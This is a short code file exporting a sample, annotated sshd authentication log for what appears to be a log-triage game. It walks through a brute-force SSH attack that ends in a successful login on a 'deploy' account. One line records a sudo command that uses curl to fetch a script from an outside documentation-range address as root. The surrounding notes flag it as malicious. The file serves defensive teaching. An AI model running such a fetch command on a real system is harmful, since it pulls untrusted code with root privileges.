// Sample sshd auth log used by the hero tail and the triage game.
// Addresses are from the documentation ranges (RFC 5737), not real hosts.
export const authLog = [
  { text: 'Oct 22 02:13:01 web01 CRON[2210]: pam_unix(cron:session): session opened for user root', note: 'A scheduled job that runs at this minute every night. Noise.' },
  { text: 'Oct 22 02:14:07 web01 sshd[2231]: Invalid user admin from 203.0.113.45 port 51822', note: 'Someone guessing usernames. Loud, but it failed.' },
  { text: 'Oct 22 02:14:12 web01 sshd[2235]: Failed password for root from 203.0.113.45 port 51840 ssh2', note: 'The same address, five seconds later, now trying root. A brute-force run, still failing.' },
  { text: 'Oct 22 02:14:15 web01 sshd[2238]: Failed password for root from 203.0.113.45 port 51856 ssh2', note: 'Three seconds apart: a script, not a person. Still failing.' },
  { text: 'Oct 22 02:14:18 web01 sshd[2241]: Failed password for deploy from 203.0.113.45 port 51871 ssh2', note: 'Now it tries an account that really exists here. Worth watching. Not yet a breach.' },
  { text: 'Oct 22 02:14:22 web01 sshd[2244]: Accepted publickey for mark from 10.0.0.12 port 49210 ssh2', note: 'Me, from the internal network, with a key. Expected.' },
  { text: 'Oct 22 02:14:31 web01 sshd[2249]: Failed password for deploy from 203.0.113.45 port 51903 ssh2', note: 'Another miss on deploy. The pressure is on one account now.' },
  { text: 'Oct 22 02:14:36 web01 sshd[2252]: Accepted password for deploy from 203.0.113.45 port 51918 ssh2', note: 'This is it. The address that failed five times just logged in with a password: the guess worked (MITRE ATT&CK T1110, brute force). Next: kill the session, lock deploy, block 203.0.113.45, and find out what it ran.', hit: true },
  { text: 'Oct 22 02:14:36 web01 sshd[2252]: pam_unix(sshd:session): session opened for user deploy', note: 'Close. This is the attacker\'s session starting, but the way in is the line before.' },
  { text: 'Oct 22 02:14:52 web01 sudo: mark : TTY=pts/0 ; PWD=/home/mark ; USER=root ; COMMAND=/usr/bin/apt update', note: 'Me, updating packages. Normal.' },
  { text: 'Oct 22 02:15:04 web01 sudo: deploy : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -s http://198.51.100.7/x.sh', note: 'Bad: a script pulled from outside, as root. But this is what happened after. Look earlier for the way in.' },
  { text: 'Oct 22 02:15:30 web01 CRON[2290]: pam_unix(cron:session): session closed for user root', note: 'The nightly job finishing. Noise.' },
]
